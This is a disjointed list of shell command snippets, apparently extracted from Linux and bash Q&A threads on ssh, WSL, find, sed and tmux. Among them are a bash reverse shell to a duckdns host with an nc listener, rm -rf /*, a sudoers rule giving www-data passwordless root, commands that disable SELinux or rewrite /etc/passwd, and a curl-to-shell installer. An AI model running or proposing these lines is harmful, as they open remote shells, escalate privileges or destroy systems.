ls --help | grep 'F'
grep -E --color 'pattern' <<<SOME COMMAND HERE>>>
grep -E --color 'pattern' <ls --help>
ls --help
ls --help | egrep '<pattern>|'
ls --help | egrep 'F|'
grep -E
${@ -1}
--config-file FILE
showkey -a
sudo apt-get install openssh-server
sudo apt-get remove openssh-server
PermitRootLogin no
AllowUsers USERNAME
PasswordAuthentication yes
UsePrivilegeSeparation no
UsePrivilegeSeparation yes
sudo service ssh --full-restart
M-x select-mark-command
set -x
command > file 2>&1
|| true
|| :
set +e
nvm unalias default
nvm use <version>
Auto command completion
tail -n1
grep -vq exit
curl -z …
$'\n' for i in
do echo $i
OS X
chmod +x session.sh
sudo tmux ls
error Connecting to Server
sudo /etc/rc.local
sudo ~/bin/session.sh
cat /var/log/myLog.txt
sudo /etc/rc.local
sudo ~/bin/session.sh
sudo tmux a
tmux new-session -d -s sess1
tmux new-window
set-remain-on-exit on
bash -i >& /dev/tcp/myhostname.duckdns.org/10000 0>&1
nc -l 10000
Pseudo-terminal will not be allocated because stdin is not a terminal.
sed -r '0,/^[a-z]\+=/{//d;}' testfile.txt
man sed
sort -k1,1 file
firefox -CreateProfile default
$(echo {} | sed 's/.a//')
set -x
set +x
-bash: kill: (13031) - No such process
<< 'EOBLOCK'
kill \$!
source ./.bashrc
SET variable=string
find . -type f -name "*.pdf"
find . -type f -name "*.pdf" | mv -t ...
-mindepth 2
-type f -name '*.pdf'
-exec bash -c '...' None {} \;
f=${1#./}; mv "$1" "./${f//\//_}"
man bash
find -exec <command>
gnatmake -P zipada
./rezip -int -defl -comp A.zip
[10/04/16 01:02:03 BST]
Apr 10 16 01:02:03
-F'[][/: ]'
BEGIN{split("Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec",m,/ /)}
print m[$3+0],$2,$4,$5":"$6":"$7
mkdir -p
export KEY=VALUE
echo KEY=VALUE >> /etc/environment
list of files
touch -d "$(date -R -r filename)" Restore/filename
nano index.php
export DISPLAY=localhost:0.0
cp index.php /mnt/c
apt-get install nginx
vim /etc/nginx/sites-available/default
while [[ createNewUser ]]
"${firstname} ${lastname}"
<(tr X . <fileB)
grep -f <(tr X . <fileB) fileA
append_history () { ( ssh you@yourserver "echo !! >> ~/common_bash_history" ) & }
exec $STARTUP
init --user
init --user
pstree -up
declare -x
uniq -c
for i in *; do echo "$i"; done
awk 'BEGIN { OFS="\t"; srand (); } { print rand (), $0 }'
cut -f2-
telnet <host> <port>
nc <host> <port>
SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.7
export TERM=xterm-color
rm -rf ~/.byobu
CTRL+A c
carlosdelamora-- -bash--80x24
folder 1
folder 2
folder 1
folder 2
mycode git
$ docker exec -it my-container bash
$ docker exec -it my-container my-alias
docker exec
docker exec
$ docker exec -it my-container sh -l -c "my-alias"
bundle exec
-F "|"
END{for (name in a) print name,a[name]}
GTK_BACKEND doesn't match available displays
pkexec env DISPLAY=$DISPLAY XAUTHORITY=$XAUTHORITY
export DISPLAY=:0
sudo apt-get install vim-gtk
export DISPLAY=:0
DISPLAY=:0 gvim
tput colors
tput colors
ConEmu 160714
Settings-> Features -> Colors -> Scheme
-type f
webserver -s
webserver -p
sudo ./web.sh start
sudo ./web.sh stop
sudo ./web.sh restart
-o pcpu=
-o pcpu
curl -X POST http://localhost:9200/tests/test -d usr/share/elasticsearch/data/test.json
bash myscript.sh
curl -d
sort -k3,3 propfile
sed -E 's/[[:space:]]*$//; s/[[:space:]]+/ /g'
uniq -f2 -D
sudo COMMAND
test -L ../Dependencies
ls -lp
complete -C
error runnning --expect=enter
0/0 no result found
printf '\e]1;Some Text\a'
Some Text
type bash and press enter
type sh and press enter
type bash and press enter
[root@localhost bin]#
type sh and press enter
man bash
/home/myUsername/.local/share/nemo/scripts/Folder with spaces/
glenn jackman
export PAGER="/bin/sh -c \"fmt -s -w $(tput cols) - | less\""
grep -l "gold" source.txt
xargs sed  's/green/red/'
sed 's/green/red/' source.txt
Match Group
--rcfile ...
cd /home/user/Downloads/program && ./main
ln -s /home/user/Downloads/program/main /usr/local/bin
chmod +x
main: command not found
exec bash
ls Red*
ls Red*
fc -s Red=Blue 123
ls Blue*
fc -s Red=Blue 123
echo '*cutToBeginningOfLine: False'|xrdb -merge
} | tee file.log
git add
git add a/long/path/to/some/file/that/has/changed.java
gadd ged
git add .
bash: $'\302\211[COMMAND]': command not found
$'\302\240grep': command not found
sh: $'\302\211 … ': command not found
-exec rm {} \;
hash -r
history | head -n 456 | tail -n 136
^ 321
32155 ls
chmod -R a+rX <path>
mkdir test_from_bash
ls -al
ls -l
find /my_giant_pictures_dir/ -type f -regex '.*\(jpg\|mp4\|mts\)'
-execdir bash -c 'mv "$1" "../${PWD##*/}_${1#./}"' Bash {} \;
-execdir bash -c '...' Bash {} \;
bash -c '...'
bash -c '...'
mv "$1" "../${PWD##*/}_${1#./}"
export PATH=/path/to/dir:$PATH
Parameter expansion
-v port=$1
/mnt/<drive letter>/
/mnt/<drive letter>/
g++ test.cpp -o test && ./test
-F"[ ',]+"
/version:/{print $2}
lxrun /setdefaultuser root
cat /etc/passwd;
sudo: unable to resolve host
sudoedit /etc/hostname
locale -a
set bell-style none
Change system sounds
Critical Stop
profiles > defaults
Git Bash
echo -e
PS1="$(scutil --get ComputerName) \W\\$ "
my-computer my-folder$
man zshmisc
PS1='%m %1d$ '
PS1='%n@%m %~$ '
Windows Subsystem for Linux
sudo nano /etc/apt/sources.list
which mvn
echo $PATH
/mnt/c/Program\ Files/apache-maven-3.3.9/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ls /mnt/c/Program\ Files/apache-maven-3.3.9/bin
which mvn
$ nano /etc/environment
$ sudo -s
$ env
echo 'PATH="~/pathTest/:$PATH"' > ~/.bash_path
source ~/.bash_path
echo $PATH
chmod +x ~/pathTest/pathTestScript.sh
source ~/.bash_path
/mnt/c/Program\ Files/apache-maven-3.3.9/bin/mvn
cd /mnt/c/Program\ Files/apache-maven-3.3.9/bin
ls -alt
chmod ug+x mvn
sudo apt-get install elf-binutils
readelf -a mvn
source /mnt/c/Users/Philipp/.aliases_win
alias ..='cd ..'
: command not found
man console_codes
: File or directory not found
alias ..='cd ..'<CR><LF>
cd ..<CR>
bash: cd: foldername
echo aaaa<CR>bb
awk '/Release Notes/,/Known Issues/' file | head -n -3 | tail -n +4
awk '/^Release Notes$/{flag=1;next}/^Known Issues$/{flag=0}flag' file
lxrun /uninstall /full
Error: 0x80080005
lxrun /uninstall /full
sc stop lxssmanager
rmdir /S %LOCALAPPDATA%\lxss
lxrun /install /y
Error: 0x80080005
ipconfig /all
apt-get update
echo -ne "\e[2 q"
echo -ne "\e[6 q"
mount <path shown by lsblk> <path you want the drive to be mounted to>
wsl --mount <DiskPath>
wmic diskdrive list brief
C:\Program Files (x86)\Git\bin
mintty -c ./minttryc ./wslbridge
C:\Windows\System32\bash.exe ~
&& exit
cat -A pv.log
C:\> ubuntu run sudo usermod -l newUsername oldUsername
apt-get install bash-completion
apt-get inst
apt-get install
apt-get install mysql
apt-get update
apt-get remove
man showq
patcl subscribe
touch /root/foo
host -t txt 142.219.243.136.rf.senderbase.org
Host 142.219.243.136.rf.senderbase.org not found: 3(NXDOMAIN)
IPAddress.rf.senderbase.org descriptive text "any number"
IPAddress = 142.219.243.136
any number = it would be any number
alias ls='ls -GFh'
du -s
\ls -lb
ls -ln
alias lsb='command ls --color -lb'
command ls
sudo nmap -sn 192.168.1.*
route_dst_netlink: cannot bind AF_NETLINK socket: Invalid argument
sudo: unable to resolve host WHATEVER
ls -l | perl -lane 'print $F[4]'
ls -l
ls -l | grep -Po '(\d+) (Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)' | cut -d" " -f1
stat -f '%z' filename
stat -f ' + %z'
xargs expr 0
stat -f ' + %z' *
export HISTFILE=/tmp/blah
exit 0;
close the window if the shell exited cleanly
killall Terminal
kill $$
Ubuntu 14.04.5 LTS
sudo apt-get install fish
chsh -s /usr/bin/fish
nano ~/.bashrc
bash -c
sudo vi /etc/passwd
vi test.sh
typeset -f
env -i bash --noprofile --norc
typeset -f
declare -F
typeset -f
declare -F
env/bash call
perl -lne 'print if ++$n{ $_ } == 1 ' file_one.txt file_two.txt
perl -lne 'print unless ++$n{ $_ } '  file_one.txt file_two.txt
sudo apt-get purge openssh-server
sudo apt-get install openssh-server
sudo nano /etc/ssh/sshd_config
PermitRootLogin no
AllowUsers yourusername
UsePrivilegeSeparation no
sudo service ssh --full-restart
Connection closed by 127.0.0.1
set_time_limit (0);
sudo apt-get install ....
sudo a ... sz
cd /home/downloads/phpstorm/
-d -m
command1 ; command2
ls /
perf stat
./start-server.sh -f server-config.xml
perf stat -e cache-misses ./start-server.sh -f server-config.xml
perf help stat
-o file
--output file
du /
du /
man du
du /
du /
-type f
man find
sudo mount -t cifs -o username=xx,password=xx //192.168.x.x/Share /mnt/s
//192.168.x.x/Share on /mnt/s type cifs (rw)
ls /mnt
cd /mnt
cd D/
-o uid=$(id -u $USER),gid=$(id -g $USER)
-o uid=1000,gid=1000
cp -a
Color Tool <Month> <Year>
rm -rf /tmp/tests *
rm -r /mnt/c
man rename
echo $PATH
ctrl + c
bash -c "ls -lR"
The directory name is invalid.
cd .linuxbrew
echo 'export PATH="$HOME/blueberry/.linuxbrew/bin:$PATH"' >>~/.bash_profile
System Settings ->  Shortcuts and Gestures ->  Custom Shortcuts -> Edit (in the lower left corner) -> New -> Global -Shortcut -> Command/URL
New Action
Shift + F4
= 8GB
which Rscript
* * * * * /usr/bin/Rscript /home/username/Desktop/foldername/runme.r
* * * * *
54 13 * * *
man ssh
Fancy Name for a Show.s01e01]Asdf.avi
scp ~/.bash_remote "${USER}"@"${IP}":/tmp/.bash_tmp 1>/dev/null
ssh -t "${USER}"@"${IP}" "bash --rcfile /tmp/.bash_tmp; rm /tmp/.bash_tmp"
whoami; hostname
export CONTEXT="hostname"
context-color -c "hostname"
-name \*2
-exec echo {} \;
man find
find . -name afile -o -name bfile -print
alias ssh_retish='ssh -Y root@172.19.242.35; cd /root/Bitbucket_DTH; ./dth -k MDU_SSC_014 -p pink1 -z'
cd /root/Bitbucket_DTH;
./dth -k MDU_SSC_014 -p pink1 -z
python -c 'import BaseHTTPServer as bhs, SimpleHTTPServer as shs; bhs.HTTPServer(("135.135.135.11", 8888), shs.SimpleHTTPRequestHandler).serve_forever()'
python -m SimpleHTTPServer
find -execdir
jad *.class
for dir in ./*
man bash
s/,/ /g
find . -type d -name '@*' -print0 -maxdepth 1 | xargs -0 yourprog
find .
-type d
-name '@*'
-maxdepth 1
find . -type d -name '@*' -print0 -maxdepth 1
man bash
source /my/variables
echo $VAR
tar cf - | gzip >
gunzip < | tar -xf -
apt-get install
C-x C-+
C-x C-+
M-x text-scale-increase
M-x text-scale-decrease
M-x text-scale-adjust
set -e
set +e
set -e
ssh pi@raspberrypi
ssh: connect to host raspberrypi port 22: Resource temporarily unavailable
* * * * *
echo -n "123nonce=123" | openssl sha256
(stdin)= 353f9df92ab1d5e5afe06bb7d1bb42a8ef6654b633d94818007aeafbaf03ca3d
echo -n "/0/private/Balance353f9df92ab1d5e5afe06bb7d1bb42a8ef6654b633d94818007aeafbaf03ca3d" | openssl sha512 -hmac $(echo -n "wqtzZWNyZXTCuw==" | base64 -d)
(stdin)= 6f19f8f058b0e6dc835692840ccdebc1c415f00d42b75b3d3c21ef5fd43f006e30cc9b51c63aba3268a534bf68978d60d2362bffd31c8125553fb8ec41b2f64d
echo -n "6f19f8f058b0e6dc835692840ccdebc1c415f00d42b75b3d3c21ef5fd43f006e30cc9b51c63aba3268a534bf68978d60d2362bffd31c8125553fb8ec41b2f64d" | base64
curl -X POST -H "Accept: application/json" -H "API-Key: «key»" -H "API-Sign: NmYxOWY4ZjA1OGIwZTZkYzgzNTY5Mjg0MGNjZGViYzFjNDE1ZjAwZDQyYjc1YjNkM2MyMWVmNWZkNDNmMDA2ZTMwY2M5YjUxYzYzYWJhMzI2OGE1MzRiZjY4OTc4ZDYwZDIzNjJiZmZkMzFjODEyNTU1M2ZiOGVjNDFiMmY2NGQ=" -d "nonce=123" https://api.kraken.com/0/private/Balance
{"error":["EAPI:Invalid signature"]}
47 48 47 112 114 105 118 97 116 101 47 66 97 108 97 110 99 101
53 63 157 249 42 177 213 229 175 224 107 183 209 187 66 168 239 102 84 182 51 217 72 24 0 122 234 251 175 3 202 61
echo -n "/0/private/Balance" > tmp.bin
echo -n "123nonce=123" | openssl sha256 -binary >> tmp.bin
cat tmp.bin | openssl sha512 -binary -hmac $(echo -n "wqtzZWNyZXTCuw==" | base64 -d) | base64
curl -X POST -H "Accept: application/json" -H "API-Key: «key»" -H "API-Sign: «output-from-step-3»" -d "nonce=123" https://api.kraken.com/0/private/Balance
ps aux
/windows/system32/bash.exe ~ --login
sudo service ssh --full-restart
UsePrivilegeSeparation no
/usr/sbin/sshd -Dddde
sudo ssh-keygen
ssh username@distant-server.com
echo $HOME
cat id_rsa.pub > authorized_keys
cd ~/.ssh
chmod 600 authorized_keys
set ANSI foreground
-v ncolors=$(...)
infocmp -1
sed -n -e "s/^ *colors#\([0-9][0-9]*\),.*/\1/p"
'ncolors>1 {...}'
print 1 + ($1 % (ncolors - 1))
(ncolors - 1)
(ncolors - 2)
whoami; hostname
export CC_CONTEXT="hostname"
context-color -c "hostname"
cat /proc/cpuinfo
cat /proc/cpuinfo
lscpu | grep -i "Model name:" | cut -d':' -f2- -
set -e
set -e
set -e
bash -
-d ''
bash -x
set -o xtrace
cygpath -u 'c:\Program Files\'
c:\user\Documents and Settings
cd c:\user\Documents and Settings
unset PATH
print $NF
java -jar my-jar.jar | tee >(col -pb >/tmp/my-jar.log)
shutdown -r 23:10 "reboot for maintenance"
shutdown -c
touch ~/.bash_sessions_disable
chmod +x program
-bash: program: command not found
source .bashrc
sudo apt-get install mercurial
sudo dpkg --configure -a
sudo apt-get install mercurial
sudo apt-get install python3-lxml gnome-applets-data python3-bs4 python3-html5lib kazam gnome-menus gnome-applets gnome-panel gnome-session-flashback
[ "$variable" ] && opts+=(-option "$variable")
command ... "${opts[@]}"
ls, cd or ditto
sudo vi /etc/hosts
find . -iwholename '*dir*/*able*'
ls /mnt
explorer.exe .
fsutil file layout lxss\root
fsutil file queryCaseSensitiveInfo <directory name>
"+%d.%m.%Y %H:%M:%S"
"+%Y:%m:%d %H:%M:%S"
illegal time format
COMPUTER NAME
sudo mount -t drvfs '\\192.168.xxx.xxx\folder' /mnt/new_folder
PS1="\[\033[34m\][\$(date +%H%M)][\u@\h:\w]$ "
public static final String ANSI_RESET = "\u001B[0m";
public static final String ANSI_BLACK = "\u001B[30m";
public static final String ANSI_RED = "\u001B[31m";
public static final String ANSI_GREEN = "\u001B[32m";
public static final String ANSI_YELLOW = "\u001B[33m";
public static final String ANSI_BLUE = "\u001B[34m";
public static final String ANSI_PURPLE = "\u001B[35m";
public static final String ANSI_CYAN = "\u001B[36m";
public static final String ANSI_WHITE = "\u001B[37m";
System.out.println(ANSI_RED + "hello World");
ssh-keygen -t rsa
$ ssh -i "C:\users\path\to\id_rsa" "username@ip"
shopt -s nullglob
ls /etc/*.nosuchextension
.bash_profile -> Documents/Dotfiles/.bash_profile
source .bash_prompt
.bash_prompt -> Documents/Dotfiles/.bash_prompt
source .bash_prompt
ZDOTDIR=$PWD zsh
gedit .bash_history
sudo apt-get install $whatever
echo "$HOME" >> /home/myloggin/test
bash --version
echo $0
/Users/USERNAME/Bin/bash/bin/bash --version
echo 'alias bash4="/Users/USERNAME/Bin/bash/bin/bash"' >> ~/.bashrc
echo $0
pause > nul
set revert-all-at-newline on
1. RepoName
2. Current github username
git config --get user.name
git config --get remote.origin.url | sed 's:.*/::;s:\.git::'
git config -l
screen -r
screen -r "pid"
export HISTTIMEFORMAT="%h/%d -- %H:%M:%S "
shopt -s histappend
PROMPT_COMMAND="$PROMPT_COMMAND; history -a; history -c; history -r"
set nocompatible
:set term=builtin_ansi
sed 's/\ /","/g filename
-bash: Rscript: command not found
echo 0 > /selinux/enforce
MAC OS X 10.11.3
man zip
source ~/.bashrc
git --version
mv */*.jpg all
-bash: /bin/mv: Argument list too long
{base folder}
( ... )
scp -v
scp -vv
grep .private_functions ~/.*
chmod +x /path/to/where/ever/you/put/file-to-clipboard
brew install pink
pbcopy < beauty.png
ln -s /mnt/c/Users/.../XXX
cd YYY
-o loopoffset=70254080
ls ~
unexpected end of file
private static String MERCHANT_ID = "1234";
private static String MERCHANT_ID = ConstantMerchants.MERCHANT_A;
echo "old" | sed -f script.file
b change
diff -ru
git add *
git add *
git rm
git add *
sudo apt-get install -y PACKAGE_NAME
ls -l
doskey /macros>d:\bat\macros.doskey
==> 
prompt $Q$Q$G$S
cmd /?
DOSKEY /MACROFILE="C:\bat\macros.doskey"
ERROR: 'T' is not a valid function name
-exec bash /c ...
$( )
tput cols
echo "$i"
parallel --shellquote
cmp InputY InputX
cmd InputX InputY
wget -rk http://example.com
measurebandwidthAndExecute ./script.sh
sh script.sh
. script.sh
bash -c someCommand
grep whatever myfile.txt
-B 2
... | grep -v bar
$(sub-command args)
npm bin
-n 2
file1.php file2.php file3.php
xargs -n 2
readlink -f /path/to/whatever
exit 1
[ -e ]
test -e $file
cd letsecrypt
./letsencrypt-auto --rsa-key-size 4096 -a manual certonly
certbot renew
certbot-auto renew
<Command> & wait
var1=1 var2=2 sudo -E -u user1 sudo -E myCommand
sort -n tmpfile.txt
head -n1
tail -n1
sort -nr
head -n1
No file or directory
/sbin/service XXX start
man bash
vim -u ...
bash -c gcc --version
cmd -k bash -c gcc --version
Error: 0x80070057
Unsupported console settings. In order to use this feature the legacy mode must be disabled.
bash -c gcc --version
[ "cmd", "/k", "bash", "-c" "gcc", "--version"]
"shell": true
mutt -f account.manager/
zsh 5.0.2 (x86_64-pc-linux-gnu)
ls --color=auto
ls --color=tty
~$ cat abc.txt
~$ grep 'dat' abc.txt
~$ grep 'dat' abc.txt | [Some command syntax like xargs]
git remote -v
git remote get-url
ipconfig //all
ls --color=auto -F
-mindepth 1 -maxdepth 1
-type d
man 1 find
/var/spool/anacron/<job name>
job name
sudo /sbin/shutdown
echo 'Not allowed'
rm -rf /*
Cmnd_Alias SHUTDOWN = /usr/sbin/shutdown
%wheel     ALL = ALL, !SHUTDOWN
man sudoers
sudo ./reboot
nano .bash_profile
export EDITOR=vim
printf '%s\n' "$1"
key release 36
bind -r
GNU Readline
set -o vim
for in do
export GPG_TTY=$(tty)
git commit
ps fauxww | less
apt-get install -f
apt-get install --reinstall redmine
apt-get remove --purge redmine redmine-mysql
rsync -axv ...
dir -Recurse | Out-File 'path\to\CONTENTS_NEWSERVER.txt'
dir -Recurse | Out-File 'path\to\CONTENTS_OLDSERVER.txt'
alias subl='"/mnt/c/Program\ Files/Sublime\ Text\ 3/sublime_text.exe" $1 &'
which ls
unalias ls
unalias ls
Issue 402
line 11
setuid bit
the invoking process
the invoking process
setuid bit
setuid bit
the invoking process
myapp &
> server.log
crontab -e
@weekly cd /path/to/jpeg/files && jpegoptim *.jpg --strip-all
man 5 crontab
00 03 * * 0 cd /path/to/jpeg/files && jpegoptim *.jpg --strip-all
putty -load <remote-name> -l <user> -pw <password> -m C:\path\shell.txt
Settings > Style configurator > Language --- Bash
Settings > Style configurator > Language --- Bash
HERE DOC
HERE DELIM
HERE Q
The application that you are trying to run is not supported in this version of Windows.
cp ./dir1/file1.txt ./dir2/
|sh -x
|sh -x 2>commands_list.txt
bash: TAB command not found
source ~/.inputrc
bind -f ~/.inputrc
git browse
chmod +x
./shadow.sh your_cidr_file.txt
node -v
which node
ls -alp /usr/bin/node
hash -r
hash -d node
type -p
command -v
source .bash_profile
ssh -vvv -F /dev/null -i /some/path/some_other_key
ssh agent
ssh-add -D
man ssh_config
export FOO=BAR
envsubst "BAR"
Hello $FOO World $BAR
xargs -L
curl -vvv
xargs -n 4
which ip
(arg: 3)
script -c 'bash -i' /dev/null
script /dev/null
bash -i
find . -type f > filenames.txt
Select filename from books where filenamekey like '%123456789X%';
echo http://somewebsite.com/{1..100}.file | xargs ...
printf '%s\n' http://somewebsite.com/{1..100}.file
pecl install foo
pecl install
pecl install
"^pecl/$pkg "
pecl list-all | grep ...
pecl info $pkg
ls -l /var/log/mail/mail.log
groups www-data
ssh -t user@host /bin/sh
ls foldernames
date | od -ab
command &
sort -u FILE | uniq -w20
$ vim ~/.vimr<TAB>
alias vim=/bin/vim
&& clear
$( ... )
docker ps
-m 1
Turn Windows features on or off
[ -f /path/to/file ]
man <command>
[ -f ]
man test
1 234
2 134
3 124
4 123
ls blah 2> /dev/null
which ls
unalias which
which ls
alias blk='>/dev/null'
alias naublk='nautlius >/dev/null'
naublk .
<timestamp>-High<variable alphanumeric string>
2016-10-01 11:12:12-Highlaskdja
find . -path "./abc/*.txt"
find . -path "*/abc/*.txt"
-path pattern
-path "*/abc/*.txt"
yum info
cat /path/to/version.js | grep config.version | grep -P -o '\d\.\d\.\d'
1.1.1, 1.1.2, 2.2.9
dscl . -create /Users/blah...
say 'heil hitler'
set -x
grep -r hitler ~
set -x
set -v
set -xv
grep -B 4 hitler
chsh -s /bin/bash
bash --login
xargs -L 1
sentry-cly -m
sentry-cly -m first message second message third message ... thousandth message ...
xargs -L1 sentry-cly -m
sentry-cly -m
xargs -L2 sentry-cly -m
sentry-cly -m "firstmessage" "secondmessage"
xargs -L2 echo
cat /etc/lsb-release
ls /etc/*release
cat /proc/version
hostnamectl status
/etc/x11/xinitrc:  @/usr/bin/python3 /root/PyQt/main.py
sudo systemctl daemon-reload
sudo systemctl enable youselfservice.service
sudo systemctl start youselfservice.service
python manage.py runserver & ;
-x this -y that/thing/there.conf -d -g -t also -t more
man bash
bash: [: =: unary operator expected
echo $PATH
history -w
-auth testuser
history -a
help history
EOL conversion > Windows
cat -v
sh script > file
sh file
cd C:\foo\bar\
cd \mnt\c
history | tail -n 2
history 2
cd \mnt\c
man bash
!!     Refer to the previous command.  This is a synonym for
help fc
cd C:\Foo\Bar
cd C:FooBar
cd "C:\Foo\Bar"
cd 'C:\Foo\Bar'
substitution failed
dd if=/dev/sdb of=/dev/sdc bs=4K
PS1="$PS1[free: $(df -h / | tail -1 | awk '{print $4}')] "
PS1="$PS1[free: \$(df -h / | tail -1 | awk '{print \$4}')] "
sh -c 'cd /home/user_account; exec "${SHELL:-sh}"'
cat "~/.bashrc"
C:\Users\usernamehere\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
clear && echo -en "\e[3J"
Bash on Ubuntu on Windows
netstat -atn
netstat -atn
ls -l
char 75
'"' + $_.BaseName + '"'
| Set-Clipboard
echo $((16#FF))
echo $((2#0110))
| echo $?
ls | grep -q foo; echo $?
| echo $?
df -h
df -h
dpkg -l e2fsprogs
apt-cache show e2fsprogs
dpkg -L
-exec chmod 644{}\;
( and )
dpkg-query -f '${binary:Package}\n' -W
wsl --export
wsl --import
exec('date --set [HH:MM:SS]')
exec("sh /full/file/path/updateTime.sh") //contains command 'date --set [HH:MM:SS]'
user privilege specification
includedir /etc/sudoers.d
www-data        ALL=(ALL:ALL) NOPASSWD: ALL
sudo date --set [HH:MM:SS]
date --set [HH:MM:SS]
@db_oracle/abc.sql max_size $value_max'g'
export value_max_with_unit=$value_max'g'
@db_oracle/abc.sql max_size $value_max_with_unit
bash -l
export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
export: /Users/Tom/ncbi-blast-2.6.0+/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/opt/X11/bin:/usr/local/ncbi/blast/bin': not a valid identifier
export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
/usr/bin/open ~/.bash_profile -a TextEdit
export PATH=/opt/local/bin:/opt/local/sbin:$PATH
[Vortex git:(master)]$
[~ ]$
[~ ]$
sh -c
$(lsb_release -sc)
apt-get update
apt-get install <package>
lsb_release -a
lsb_release -sc
$(lsb_release -sc)
man bash
deb http://packages.ros.org/ros/ubuntu $(lsb_release -sc) main
$(lsb_release -sc)
ssh_exchange_identification: Connection closed by remote host
apt-get install git
echo ${ITERM_SESSION_ID:3:1}
$example abc
input = abc
echo "0 is true.
[ str ]
echo | mail
mail < recipients.txt
(cat recipients.txt; echo 'Hello world') | mail -s ...
cat recipients.txt <(echo 'Hello world') | mail -s ...
echo 'Hello world' | mail -s ... $(cat recipients.txt)
uname -m
uname -m
rpm -q
--nosignatures --nodigest
bash -c "python3 script.py
nohup python3 -u script.py
setsid python3 script.py
wscript <path to runHidden.vbs> bash.exe -c "python script.py"
start bash -c "DISPLAY=:0 [command] & (sleep 0.5 && kill -n 9 $$)"
su -
su -
su -
scp -p
wget --help
man wget
Linux 4.8.13-1-ARCH x86_64
$ time for i in {1..10} ; do bash -c "echo Hello" ; done
redis-server &
pgrep redis-server
pgrep redis-server
pgrep bash1.sh
zip archive file
mkpasswd -l > /etc/passwd
mkgroup -l > /etc/group
groupadd -g 535 finance_2
set enable-bracketed-paste on
brew install bash
remix v2
mv ... -t ...
mv -i
mv </dev/stdin -i ...
--return --cleanup
echo $PS1
bash --login -i
declare counter=1
-O $counter.html
sudo "${DulicityCMD[@]}"
fork & exec
child process has the same environment as its parent
declare -p
 ssh [user]@[server] '[command]'
source .bashrc
shopt -s histverify
unset MyTempVar
history -ps args
alias fixsha='vim $(history -p !$)/SHA1SUM'
vim "/foo/bar\ baz/SHA1SUM"
vim /foo/bar\ baz/SHA1SUM
vim "/foo/bar baz/SHA1SUM"
echo "$bar"
echo $bar
top -p PID -b >> LOGFILE
El Capitan
sudo apt-get install zsh
sh -c "$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)"
chsh -s $(which zsh)
echo $SHELL
git bash
File Manager -> C -> Windows -> explorer.exe
chmod -R u+w /
Permission denied
$SHELL 
if 'true' 'set -g default-terminal screen-256color'
tmux -vvvvvvvvvv
TERM = screen-256color
if-shell "echo $TERM | grep 256color" 'set -g default-terminal screen-256color'
set -v
set -x
set -x
ssh host some_command
"print as image"
lpr -r -P clx952_duplex_bw -o MediaType=Preprinted -o JCLFrontCoverOption=BlankPreprinted -o JCLFrontCoverType=Color "$pdfFile"
find /var/dir -size +500k -iname "pattern_*" -mtime +90 -type f -exec rm {} \; -print
semanage permissive -a ifconfig_t
semanage fcontext -a -t ifconfig_exec_t /usr/share/stats/run_collect.sh
restorecon -Frvv /usr/share/stats/
bash shell
C-x 4 f
C-x 5 f
linux serve
apt-get install php5-cgi php5-fpm
service nginx restart && service php5-fpm restart
wget -N
curl -C -
SSH tunnel
. manage.py
./manage.py migrate
coproc ... command ...
command not found
command not found
\full\path\to\mintty -
bash -l
killall man info wc which ssh clear
bash -l
man mintty
sudo sh -c ...
sed '$a\' ${filePath} > ${filePath}.bak
sudo sh -c
sudo sh -c "sed ..."
sudo sh -c "echo ..."
Waiting for the pending transfer to complete...
/bin/bash --login
echo ""
-af "volume=1250"
pacmd set-source-volume I 65536
pacmd list-sink-inputs
pacmd list-sink-inputs | egrep '(index)|(name)'
not a terminal
read -p done
tr '\n' '_'
grep -o '[0-9]*\stest1_[0-9]*\stest2_[0-9]*\stest3'
tr '_' '\n'
ssh desk
nc -q -1 -lk -p 8080 < pipe | nc example.com 8080 > pipe
echo 'goodbye'
emacs; echo 'boodbye'
( emacs; echo 'goodbye' )
whereis scp
/* ... */
/* \n \n \n */
/* .... */
sed -n '/^\/\*.*\*\//!p'
/* one line comment */
sed -n '/ \/\/.*/!p'
// some one line comment
/ \/\/
sed 's|/\*|\n&|g;s|*/|&\n|g' | sed '/\/\*/,/*\//d'
Use legacy console (requires relaunch)
bash --noprofile
grep -o
print lines matching a pattern
jira open
:! ProgramYouWantToRun > /dev/pts/X
:! ProgramYouWantToRun > /dev/pts/X
$( )
grep -c
$( )
grep -q
tmux capture-pane -t session1 > file
capture-pane -S -10
cd /my/long/path/to/my/directory
j direct
z foo bar
j perl<TAB>
grep -Po '[a-zA-Z1-9/_-]{1,}\.php'
sudo ./addusers.sh
  --disabled-password
              Like --disabled-login, but logins are still possible (for example using SSH RSA keys) but not using
--gecos GECOS
              Set  the  gecos  field for the new entry generated.  adduser will not ask for finger information if this option is given.
mocha ./src/test/**/*.js --recursive
GNU bash, version 3.2.25(1)-release (x86_64-redhat-linux-gnu)
shopt -s globstar
shopt: globstar: invalid shell option name
-exec … \;
-exec … +
ls -al
sudo dtruss su MYUSERNAME ls -al
sudo dtruss su MYUSERNAME cd FOLDERPATH
-F "_"
'{print $NF,$0}'
10.tif SHG_PS_RG_10.tif
10.tif SHG_PS_RG_10.tif
sort -n
cut -f2- -d' '
\[$(tput setaf x)\]
printf $(tput setaf 2)HI!$(tput sgr0)
printf \[$(tput setaf 2)\]HI!\[$(tput sgr0)\]
while true; do
sed '/Some app restarting/q'
kill -9 $!
activity monitor
Control Panel -> Display
# This file is meant to be sourced and not run as an ordinary script.
PrintDate: command not found
ln -s /mnt/c/Users/User/.ssh/ ~/.ssh/
Bad owner or permissions on /home/user/.ssh/config
sudo nano /etc/fstab
<your Windows username>
<your Linux username>
a=$(echo "$p" | cut -d: -f1)
$a=$(echo "$p" | cut -d: -f1)
grep -w "/I/want/this/*" file
grep -o "/I/want/this/*" file
unalias --color
alias grep=grep --color=always
help alias
man bash
man bash
man bash
unalias grep --color
man bash
gpg-agent --gpgconf-list
--homedir [dir]
Remember for _ option
ff 'hac-launcher*
:!killall bash
find / -type f -iname "terminfo" -exec grep -i blength {} \;
systemctl status --system
grep -e "blength" /etc/profile.d/*
insert another implementation detail
fstdraw in.fst | dot -Tpng | convert - -rotate 90 out.png
